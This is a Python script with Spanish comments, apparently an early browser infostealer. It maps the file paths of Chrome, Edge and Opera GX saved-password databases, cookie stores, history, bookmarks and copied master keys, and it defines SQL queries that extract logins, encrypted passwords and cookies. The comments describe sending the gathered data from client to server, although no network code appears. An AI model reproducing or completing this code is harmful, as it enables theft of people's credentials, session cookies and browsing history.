import sqlite3
import os

# obtener y leer
# Copiar a otro directorio o no

# Enviar de client a server , haciendo que en el serve se guarden en x sitio.

BasePath = os.getenv('localappdata')

def get_db_data(file,command,master_key=None):
    con = sqlite3.connect(TARGET_FILE_PATH[file])
    cursor = con.cursor()
    cursor.execute(SQL[command])
    data = cursor.fetchall()

    return data


TARGET_FILE_PATH = {
    "CHROME_LOCAL_STATE_FILE_PATH": BasePath + \
                                    '\\Google\\Chrome\\User Data\\Local State',
    "CHROME_PASSWORDS_DB_PATH": BasePath + \
                                    '\\Google\\Chrome\\User Data\\Default\\Login Data',
    "CHROME_COOKIES_DB_PATH": BasePath + \
                                    '\\Google\\Chrome\\User Data\\Default\\Cookies',
    "CHROME_HISTORY_DB_PATH": BasePath + \
                                    '\\Google\\Chrome\\User Data\\Default\\History',
    "CHROME_BOOKMARKS_FILE_PATH": BasePath + \
                                    '\\Google\\Chrome\\User Data\\Default\\Bookmarks',
    "EDGE_LOCAL_STATE_FILE_PATH": BasePath + \
                                    '\\Microsoft\\Edge\\User Data\\Local State',
    "EDGE_PASSWORDS_DB_PATH": BasePath + \
                                    '\\Microsoft\\Edge\\User Data\\Default\\Login Data',
    "EDGE_COOKIES_DB_PATH": BasePath + \
                                    '\\Microsoft\\Edge\\User Data\\Default\\Cookies',
    "EDGE_HISTORY_DB_PATH": BasePath + \
                                    '\\Microsoft\\Edge\\User Data\\Default\\History',
    "EDGE_BOOKMARKS_FILE_PATH": BasePath + \
                                    '\\Microsoft\\Edge\\User Data\\Default\\Bookmark',
    "OPERA_LOCAL_STATE_FILE_PATH": BasePath + \
                                   '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Local State',
    "OPERAGX_PASSWORDS_DB_PATH": BasePath + \
                                    '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Login Data',
    "OPERAGX_COOKIES_DB_PATH": BasePath + \
                                    '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Cookies',
    "OPERAGX_HISTORY_DB_PATH": BasePath + \
                                    '\\..\\Roaming\\Opera Software\\Opera GX Stable\\History',
    "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + \
                                    '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Bookmark',
    "Chrome_Master_Key": BasePath + \
                                    '\\Temp\\Copy\\Chrome_Master_Key',
    "Edge_Master_Key": BasePath + \
                                    '\\Temp\\Copy\\Edge_Master_Key',
    "OperaGX_Master_Key": BasePath + \
                                    '\\Temp\\Copy\\OperaGX_Master_Key',

}



SQL = {
    "LOGIN_DATA_SQL": "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins;",
    "COOKIES_SQL": "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, creation_utc, expires_utc, last_access_utc FROM cookies;",
    "HISTORY_SQL": "SELECT url, title, visit_count, last_visit_time FROM urls;",
    "DOWNLOADS_SQL": "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads;"
}

print(TARGET_FILE_PATH["OPERAGX_HISTORY_DB_PATH"])
print(os.path.isfile(TARGET_FILE_PATH["OPERAGX_HISTORY_DB_PATH"]))


x = get_db_data("CHROME_HISTORY_DB_PATH","HISTORY_SQL")
for i in x:
    print(i)